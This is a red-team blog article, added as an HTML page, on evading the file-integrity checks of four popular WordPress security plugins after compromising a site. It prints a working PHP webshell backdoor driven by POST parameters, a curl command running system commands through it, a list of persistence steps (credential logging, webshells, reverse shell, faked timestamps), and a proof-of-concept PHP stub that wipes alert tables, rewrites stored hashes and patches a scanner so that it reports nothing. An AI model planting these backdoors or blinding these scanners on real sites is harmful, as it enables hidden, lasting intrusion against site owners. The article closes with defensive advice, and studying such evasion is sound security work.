@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Defeating WordPress Security Plugins (Revisited) | Doomsday Vault</title>
+<meta name="generator" content="Jekyll v3.9.5" />
+<meta property="og:title" content="Defeating WordPress Security Plugins (Revisited)" />
+<meta name="author" content="X-C3LL" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Article about how to subvert file integrity checks made by most popular WordPress Plugins" />
+<meta property="og:description" content="Article about how to subvert file integrity checks made by most popular WordPress Plugins" />
+<link rel="canonical" href="http://localhost:4000/posts/2018/03/09/bypass-wordpress-plugins.html" />
+<meta property="og:url" content="http://localhost:4000/posts/2018/03/09/bypass-wordpress-plugins.html" />
+<meta property="og:site_name" content="Doomsday Vault" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2018-03-09T13:00:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Defeating WordPress Security Plugins (Revisited)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"X-C3LL"},"dateModified":"2018-03-09T13:00:00+01:00","datePublished":"2018-03-09T13:00:00+01:00","description":"Article about how to subvert file integrity checks made by most popular WordPress Plugins","headline":"Defeating WordPress Security Plugins (Revisited)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/2018/03/09/bypass-wordpress-plugins.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.jpg"},"name":"X-C3LL"},"url":"http://localhost:4000/posts/2018/03/09/bypass-wordpress-plugins.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=c27a30cb27997bd3ed45ba5a77bd97bd27cbeb64">
+    <!--[if lt IE 9]>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <![endif]-->
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <div class="wrapper">
+      <header>
+
+        <h1><a href="http://localhost:4000/">Doomsday Vault</a></h1>
+
+        
+          <img src="/assets/img/logo.jpg" alt="Logo" />
+        
+
+        <p>X-C3LL's Personal Blog :)</p>
+
+
+        
+        <ul class="downloads">
+          <li><a href="https://twitter.com/TheXC3LL">@TheXC3LL<strong>Twitter</strong></a></li>
+          <li><a href="https://www.linkedin.com/in/thexc3ll/">thexc3ll<strong>LinkedIn</strong></a></li>
+          <li><a href="https://mastodon.social/@XC3LL">@XC3LL<strong>Mastodon</strong></a></li>
+        </ul>
+        
+               <nav>
+  <ul>
+    <li><a href="/">Home</a></li>
+  <li><a href="/about.html">About</a></li>
+    <li><a href="/cves.html">CVEs</a></li>
+    <li><a href="/tools.html">Tools</a></li>
+    <li><a href="/stuff.html">Slides & Articles</a></li>
+  <li><a href="/rss.xml">RSS</a>/<a href="/atom.xml">Atom</a></li>
+  
+</ul>
+</nav>
+      </header>
+      <section>
+
+      <small>9 March 2018</small>
+<h1>Defeating WordPress Security Plugins (Revisited)</h1>
+
+
+<h2 id="disclaimer">Disclaimer</h2>
+<p>        
+Before to begin to read this article keep in mind this: security plugins are <strong>great</strong> and you need to install at least one. They act as the first barrier against attackers and usually helps to keep a good level of hardening in your WordPress. But using them as a file integrity checker sucks. A lot. Never trust them.</p>
+
+<h2 id="introduction">Introduction</h2>
+<p>        
+Four years ago I wrote a post called “<a href="http://www.0verl0ad.net/2014/10/the-walking-wordpress-i-defeating.html">Defeating Security Plugins</a>” (in Spanish, sorry <strong>:(</strong> ) where I explained how to defeat the file integrity capabilities of popular plugins in the WordPress ecosystem. Today I want to check again this kind of plugin.</p>
+
+<p>        
+As I always say we need to keep our tracks to the minimum to avoid being detected too early. When we compromise an external or internal WordPress we need to let inside some backdoors. For example in a standard situation we are going to:</p>
+
+<ul>
+  <li>Edit some existent PHP scripts to add a backdoor (maybe via any function callable like array_map() to hide in plain sight)</li>
+  <li>Modify the login to save credentials in plain text</li>
+  <li>Create few webshells</li>
+  <li>Create a PHP to tunnelize TCP connections (for example a modified version of <a href="https://github.com/sensepost/reGeorg">reGeorge</a>)</li>
+  <li>Add a <a href="https://www.tarlogic.com/blog/wordpress-backdoors-sql/">SQL trigger to retake the control in the future</a></li>
+  <li>Reverse shell</li>
+  <li>Modify the timestamps of all files affected</li>
+</ul>
+
+<p>        
+Because time matters, all of these actions must be done in a semi-automatized way. And you have to reduce the number of HTTP requests needed to finish the job. That means that only one file has to create and edit the others files and fake the timestamps. This is a lesson learnt after few years meeting with the blue team after an exercise.</p>
+
+<p>        
+If the blue team are not veteran enough they will fail finding all of our persistences. The reason behind this is that they tends to check only the files accessed via HTTP requests, and not the others. If you create a webshell but you never interact with it, probably it will be hidden more time.</p>
+
+<p>        
+In a really big enterprise is hard to keep the control of every server. The “IT Shadow” is a real trouble for Blue Teamers, because there are servers that are not under their vision. And the security of these servers usually is not enough. In the case of servers using WordPress is far probably that some department (<em>Hello Marketing I am talking with you!</em>) installed the WordPress with only a security plugin and nothing more.</p>
+
+<p>        
+If we learn how to bypass (or subvert) the file integration checks made by security plugins, we can automatize the process and keep our tracks to the minium (plus the time we save). Less alerts, more party <strong>:)</strong>.</p>
+
+<p>        
+So… let’s go!</p>
+
+<h2 id="wordfence-security-version-702---2m-active-installs">Wordfence Security (version 7.0.2 - +2M active installs)</h2>
+<p>        
+This is the most popular plugin with more than two millions of active installs. One of the capabilities of this plugin is (in his own words):</p>
+
+<blockquote>
+  <p><em>Compares your core files, themes and plugins with what is in the WordPress.org repository, checking their integrity and reporting any changes to you.</em></p>
+</blockquote>
+
+<p>        
+Ok, let’s test this adding a “frontdoor.php” file to plugins folder, edit “index.php”, and create a new PHP inside WordFence folder. The content of our “backdoor” in all cases will be:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+	<span class="o">@</span><span class="nv">$filter</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'filter'</span><span class="p">];</span>
+	<span class="o">@</span><span class="nv">$words</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'text'</span><span class="p">]);</span>
+	<span class="o">@</span><span class="nv">$filtered_words</span> <span class="o">=</span> <span class="nb">array_filter</span><span class="p">(</span><span class="nv">$words</span><span class="p">,</span> <span class="nv">$filter</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>        
+We can see our little backdoor working perfectly:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl http://localhost/wordpress/wp-content/plugins/wordfence/frontdoor.php --data "filter=system&amp;text=uname -a"
+Linux kaiju 3.16.0-4-amd64 #1 SMP Debian 3.16.51-3 (2017-12-13) x86_64 GNU/Linux
+</code></pre></div></div>
+<p>        
+I got a little problem with this plugin. Even setting the maximum level of sensibility it does not detect my backdoors or the files modified <strong>(U_U”)</strong>. Well, that is not true: I got an issue…. <code class="language-plaintext highlighter-rouge">User "admin" with "administrator" access has an easy password.Type: Insecure Password</code>. Maybe the “free” edition not works so great, but we can use this issue generated (the weak password detected) to see how issues are stored and shown to the administrator.</p>
+
+<p>        
+Basically this plugin stores the issues information in the database under a table called “<strong>prefix</strong>_wfissues”. In this table we find the “severity” and the messages used to alert the admin. So we only need to do a “truncate” with a SQL query to flush this information.</p>
+
+<p>        
+Additionaly exists a table called “__prefix__wfFileMods” wich contains the columns “filename”, “filenameMD5”, “oldMD5”, and “MD5”. We can manipulate this table in order to be stealthier and not trigger an alert.</p>
+
+<h2 id="ithemes-security-version-692---900k-active-installs">iThemes Security (version 6.9.2 - +900K active installs)</h2>
+<p>        
+The method used by this plugin is based on to keep the list of files, the timestamp and his owns MD5 in the table <strong>prefix_</strong>options, under the key “<strong>itsec_local_file_list</strong>”. It looks like:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a:3346:{s:15:"wp-settings.php";a:2:{s:1:"d";i:1519165466;s:1:"h";s:32:"65925f28e27552ed6844be036d90cc95";}
+s:9:".htaccess";a:2:{s:1:"d";i:1520727850;s:1:"h";s:32:"6c10a3562901b71856657cfe40321bd1";}
+...
+...
+</code></pre></div></div>
+<p>        
+After our implants are deployed, we only need to update this array with the new md5 value of each file modified.</p>
+
+<h2 id="all-in-one-wp-security--firewall-version-432---600k-active-installs">All In One WP Security &amp; Firewall (version 4.3.2 - +600K active installs)</h2>
+<p>        
+Between the capabilities of this plugin we can see:</p>
+
+<blockquote>
+  <p><em>The file change detection scanner can alert you if any files have changed in your WordPress system. You can then investigate and see if that was a legitimate change or some bad code was injected.</em></p>
+</blockquote>
+
+<p>        
+In the same way as before, we will modify the contents of a PHP file (in this case we are going to modify the “wp-security.php” file owned by this plugin):</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="cm">/*
+Plugin Name: All In One WP Security
+Version: 4.3.2
+Plugin URI: https://www.tipsandtricks-hq.com/wordpress-security-and-firewall-plugin
+Author: Tips and Tricks HQ, Peter Petreski, Ruhul, Ivy
+Author URI: https://www.tipsandtricks-hq.com/
+Description: All round best WordPress security plugin!
+Text Domain: all-in-one-wp-security-and-firewall
+Domain Path: /languages
+License: GPL3
+*/</span>
+	<span class="c1">// Our backdoor</span>
+	<span class="o">@</span><span class="nv">$filter</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'filter'</span><span class="p">];</span>
+    <span class="o">@</span><span class="nv">$words</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'text'</span><span class="p">]);</span>
+    <span class="o">@</span><span class="nv">$filtered_words</span> <span class="o">=</span> <span class="nb">array_filter</span><span class="p">(</span><span class="nv">$words</span><span class="p">,</span> <span class="nv">$filter</span><span class="p">);</span>
+    <span class="c1">// End of backdoor</span>
+    
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">defined</span><span class="p">(</span><span class="s1">'ABSPATH'</span><span class="p">)){</span>
+    <span class="k">exit</span><span class="p">;</span> <span class="c1">//Exit if accessed directly</span>
+<span class="p">}</span>
+<span class="mf">...</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>        
+This time we get an alert saying that the file <code class="language-plaintext highlighter-rouge">/var/www/html/wordpress/wp-content/plugins/all-in-one-wp-security-and-firewall/wp-security.php</code> was modified. If we investigate how this plugin works we will notice fast that new tables were created in the database when the plugin was installed. One of them, <strong>prefix</strong>_aiowps_global_meta, has a metavalue <em>“file_change_detection”</em> and a serialized array wich contains the name and metadata (timestamp and size) associated with every file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a:2397:{s:39:"/var/www/html/wordpress/wp-settings.php";a:2:{s:13:"last_modified";i:1507069246;s:8:"filesize";i:16246;}...
+</code></pre></div></div>
+
+<p>        
+If after performing a scan task any change is discovered (timestamp or size has changed, or there is a file addition or deletion) another metavalue is filled alerting about the change. So basically this plugin works saving a list with files (name, size and last change) and compare it with the values saved: if something differs an alert is triggered. In order to subvert this type of check we only need to edit this serialized object after we implant our backdoors.</p>
+
+<h2 id="shield-security-for-wordpress-version-632---70k-active-installs">Shield Security for WordPress (version 6.3.2 - +70K active installs)</h2>
+<p>        
+Another plugin with a file integrity scanner that tries to discover core files modified. If we perform few searchs with grep and we dive into the code we can see this extract located at <strong>src/common/icwp-wpfunctions.php</strong>:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mf">...</span>
+     <span class="cd">/**                                                                                                                                                                            
+      * @return string[]                                                                                                                                                            
+      */</span>                                                                                                                                                                            
+     <span class="k">public</span> <span class="k">function</span> <span class="n">getCoreChecksums</span><span class="p">()</span> <span class="p">{</span>                                                                                                                                           
+         <span class="nv">$aChecksumData</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>                                                                                                                                                    
+         <span class="nv">$sCurrentVersion</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getVersion</span><span class="p">();</span>                                                                                                                                    
+                                                                                                                                                                                    
+         <span class="k">if</span> <span class="p">(</span> <span class="nb">function_exists</span><span class="p">(</span> <span class="s1">'get_core_checksums'</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="c1">// if it's loaded, we use it.                                                                                             </span>
+             <span class="nv">$aChecksumData</span> <span class="o">=</span> <span class="nf">get_core_checksums</span><span class="p">(</span> <span class="nv">$sCurrentVersion</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getLocale</span><span class="p">(</span> <span class="kc">true</span> <span class="p">)</span> <span class="p">);</span>                                                                                     
+         <span class="p">}</span>                                                                                                                                                                          
+         <span class="k">else</span> <span class="p">{</span>                                                                                                                                                                     
+             <span class="nv">$aQueryArgs</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>                                                                                                                                                   
+                 <span class="s1">'version'</span> <span class="o">=&gt;</span> <span class="nv">$sCurrentVersion</span><span class="p">,</span>                                                                                                                                     
+                 <span class="s1">'locale'</span>  <span class="o">=&gt;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getLocale</span><span class="p">(</span> <span class="kc">true</span> <span class="p">)</span>                                                                                                                              
+             <span class="p">);</span>                                                                                                                                                                     
+             <span class="nv">$sQueryUrl</span> <span class="o">=</span> <span class="nf">add_query_arg</span><span class="p">(</span> <span class="nv">$aQueryArgs</span><span class="p">,</span> <span class="s1">'https://api.wordpress.org/core/checksums/1.0/'</span> <span class="p">);</span>                                                                           
+             <span class="nv">$sResponse</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">loadFS</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">getUrlContent</span><span class="p">(</span> <span class="nv">$sQueryUrl</span> <span class="p">);</span>                                                                                                             
+             <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span> <span class="nv">$sResponse</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>                                                                                                                                          
+                 <span class="nv">$aDecodedResponse</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span> <span class="nb">trim</span><span class="p">(</span> <span class="nv">$sResponse</span> <span class="p">),</span> <span class="kc">true</span> <span class="p">);</span>                                                                                                       
+                 <span class="k">if</span> <span class="p">(</span> <span class="nb">is_array</span><span class="p">(</span> <span class="nv">$aDecodedResponse</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span> <span class="nv">$aDecodedResponse</span><span class="p">[</span> <span class="s1">'checksums'</span> <span class="p">]</span> <span class="p">)</span>
+                  <span class="o">&amp;&amp;</span> <span class="nb">is_array</span><span class="p">(</span> <span class="nv">$aDecodedResponse</span><span class="p">[</span> <span class="s1">'checksums'</span> <span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>                                
+                     <span class="nv">$aChecksumData</span> <span class="o">=</span> <span class="nv">$aDecodedResponse</span><span class="p">[</span> <span class="s1">'checksums'</span> <span class="p">];</span>                                                                                                             
+                 <span class="p">}</span>                                                                                                                                                                  
+             <span class="p">}</span>                                                                                                                                                                      
+         <span class="p">}</span>                                                                                                                                                                          
+         <span class="k">return</span> <span class="nb">is_array</span><span class="p">(</span> <span class="nv">$aChecksumData</span> <span class="p">)</span> <span class="o">?</span> <span class="nv">$aChecksumData</span> <span class="o">:</span> <span class="k">array</span><span class="p">();</span>                                                                                                              
+     <span class="p">}</span>
+<span class="mf">...</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>        
+In this chunk of code we can see how the plugin checks the existence of <strong>get_core_checksums</strong> function. This is an internal WordPress function (introduced in WordPress 3.7.0) that does a request to the WordPress API (https://api.wordpress.org/core/checksums/1.0/) and retrieves the checksums of core files. If the function is not found (maybe because is an older version of WordPress), the plugin does the request and get the checksums.</p>
+
+<p>        
+The easiest way to avoid the detection is just edit this file and change the return. If the function returns and empty array (<em>return array();</em>) the plugin will say “Ok, everything it’s ok”:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Core File Scanner Results
+
+There were no modified files discovered in the scan.
+</code></pre></div></div>
+<p>        
+Cool <strong>:)</strong>.</p>
+
+<h2 id="poc--gtfo">PoC || GTFO</h2>
+<p>        
+In this short article we have seen how to subvert the file integrity check used by the most popular security plugins in WordPress. Following this idea we can create a little stub of code that must be added to a loaded plugin. This code will disable (or hide) our files backdoored. You can improve it (this code is just a PoC to show the main idea).</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">add_action</span><span class="p">(</span><span class="s2">"wp_head"</span><span class="p">,</span> <span class="s2">"knockout"</span><span class="p">);</span>                                                                                                                                                 
+ <span class="nb">define</span><span class="p">(</span><span class="s2">"DB_PRE"</span><span class="p">,</span> <span class="nv">$table_prefix</span><span class="p">);</span>                                                                                                                                                   
+                                                                                                                                                                                    
+ <span class="k">function</span> <span class="n">patch_shield</span> <span class="p">(</span><span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>                                                                                                                                                    
+     <span class="k">if</span> <span class="p">(</span><span class="nb">stristr</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span> <span class="s1">'return is_array( $aChecksumData ) ? $aChecksumData : array();'</span><span class="p">))</span> <span class="p">{</span>                                                                                         
+         <span class="k">return</span> <span class="s2">"return array();</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>                                                                                                                                                
+     <span class="p">}</span>                                                                                                                                                                              
+     <span class="k">return</span> <span class="nv">$line</span><span class="p">;</span>                                                                                                                                                                  
+ <span class="p">}</span>                                                                                                                                                                                  
+                                                                                                                                                                                    
+ <span class="c1">// Here is where the magic lies :)                                                                                                                                                 </span>
+ <span class="k">function</span> <span class="n">knockout</span><span class="p">()</span> <span class="p">{</span>                                                                                                                                                              
+     <span class="c1">// Filenames we want to hide                                                                                                                                                   </span>
+     <span class="nv">$hide</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">"wp-settings.php"</span><span class="p">,</span> <span class="s2">"wp-content/plugins/akismet/akismet.php"</span><span class="p">);</span>                                                                                                    
+     <span class="c1">// Ok, let's kill iThemes Security                                                                                                                                             </span>
+     <span class="nv">$o</span> <span class="o">=</span> <span class="nf">get_option</span><span class="p">(</span><span class="s2">"itsec_local_file_list"</span><span class="p">);</span>                                                                                                                                      
+     <span class="c1">// Change the values                                                                                                                                                           </span>
+     <span class="k">foreach</span> <span class="p">(</span><span class="nv">$hide</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>                                                                                                                                                     
+         <span class="nv">$o</span><span class="p">[</span><span class="nv">$file</span><span class="p">][</span><span class="s1">'d'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">filemtime</span><span class="p">(</span><span class="nf">get_home_path</span><span class="p">()</span> <span class="mf">.</span> <span class="nv">$file</span><span class="p">);</span> <span class="c1">// Timestamp                                                                                                          </span>
+         <span class="nv">$o</span><span class="p">[</span><span class="nv">$file</span><span class="p">][</span><span class="s1">'h'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">md5_file</span><span class="p">(</span><span class="nf">get_home_path</span><span class="p">()</span> <span class="mf">.</span> <span class="nv">$file</span><span class="p">);</span> <span class="c1">// Hash                                                                                                                </span>
+     <span class="p">}</span>                                                                                                                                                                              
+     <span class="c1">// Update values                                                                                                                                                               </span>
+     <span class="nf">update_option</span><span class="p">(</span><span class="s2">"itsec_local_file_list"</span><span class="p">,</span> <span class="nv">$o</span><span class="p">);</span>                                                                                                                                    
+                                                                                                                                                                                    
+     <span class="c1">// Kill WordFence alerts                                                                                                                                                       </span>
+     <span class="nv">$con</span> <span class="o">=</span> <span class="nb">mysql_connect</span><span class="p">(</span><span class="no">DB_HOST</span><span class="p">,</span> <span class="no">DB_USER</span><span class="p">,</span> <span class="no">DB_PASSWORD</span><span class="p">);</span>                                                                                                                           
+     <span class="nb">mysql_select_db</span><span class="p">(</span><span class="no">DB_NAME</span><span class="p">);</span>                                                                                                                                                      
+     <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"truncate "</span><span class="mf">.</span> <span class="no">DB_PRE</span> <span class="mf">.</span><span class="s2">"wfIssues;"</span><span class="p">;</span>                                                                                                                                     
+     <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>                                                                                                                                                           
+                                                                                                                                                                                    
+     <span class="c1">// Kill All-in-One WP Security                                                                                                                                                 </span>
+     <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"truncate "</span><span class="mf">.</span> <span class="no">DB_PRE</span> <span class="mf">.</span> <span class="s2">"aiowps_global_meta;"</span><span class="p">;</span>                                                                                                                          
+     <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>                                                                                                                                                           
+                                                                                                                                                                                    
+     <span class="c1">// Patch Shield Security                                                                                                                                                       </span>
+     <span class="nv">$shield</span> <span class="o">=</span> <span class="nf">get_home_path</span><span class="p">()</span> <span class="mf">.</span> <span class="s2">"wp-content/plugins/wp-simple-firewall/src/common/icwp-wpfunctions.php"</span><span class="p">;</span>                                                                           
+                                                                                                                                                                                    
+     <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$shield</span><span class="p">))</span> <span class="p">{</span>                                                                                                                                                    
+         <span class="k">echo</span> <span class="s2">"YEAH"</span><span class="p">;</span>                                                                                                                                                               
+         <span class="nv">$lines</span> <span class="o">=</span> <span class="nb">file</span><span class="p">(</span><span class="nv">$shield</span><span class="p">);</span>                                                                                                                                                    
+         <span class="nv">$lines</span> <span class="o">=</span> <span class="nb">array_map</span><span class="p">(</span><span class="s1">'patch_shield'</span><span class="p">,</span> <span class="nv">$lines</span><span class="p">);</span>                                                                                                                                
+         <span class="nb">var_dump</span><span class="p">(</span><span class="nv">$lines</span><span class="p">);</span>                                                                                                                                                          
+         <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$shield</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">''</span><span class="p">,</span> <span class="nv">$lines</span><span class="p">));</span>                                                                                                                           
+     <span class="p">}</span>                                                                                                                                                                              
+                                                                                                                                                                                    
+ <span class="p">}</span>      
+</code></pre></div></div>
+
+<h2 id="final-words">Final words</h2>
+
+<p>        
+Do not trust the file integrity checks made by your security plugins in WordPress. Because if an attacker has the ability to edit your files, that means that he can edit whatever is inside your WordPress’ database and patch other files. So this kind of checks always must be done from outside, using software like Wazuh or similar.</p>
+
+<p>        
+As usual, if you detect a typo or what to improve this article feel free to ping me at my twitter <a href="https://twitter.com/TheXC3LL">@TheXC3LL</a>. Byt3z!</p>
+
+
+
+
+      </section>
+      <footer>
+        
+        <p>This project is maintained by <a href="https://github.com/pages-themes">pages-themes</a></p>
+        
+        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
+      </footer>
+    </div>
+    <script src="/assets/js/scale.fix.js"></script>
+  </body>
+</html>
